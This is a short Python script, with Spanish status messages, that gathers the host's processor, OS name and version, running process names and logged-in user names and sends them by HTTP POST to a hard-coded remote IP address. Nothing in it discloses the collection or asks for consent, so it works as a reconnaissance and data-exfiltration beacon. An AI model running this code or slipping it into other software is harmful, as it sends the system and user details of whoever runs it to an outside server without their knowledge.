import psutil  
import platform  
import requests


processor = platform.processor()
os_name = platform.system()
os_version = platform.version()


process_list = [p.info['name'] for p in psutil.process_iter(['name'])]


users = [user.name for user in psutil.users()]


data = {
    "processor": processor,
    "process_list": process_list,
    "users": users,
    "os_name": os_name,
    "os_version": os_version
}


url = "http://3.137.162.127:5000/collect_data"  


response = requests.post(url, json=data)


if response.status_code == 200:
    print("Datos enviados correctamente")
else:
    print(f"Error al enviar los datos: {response.status_code}")
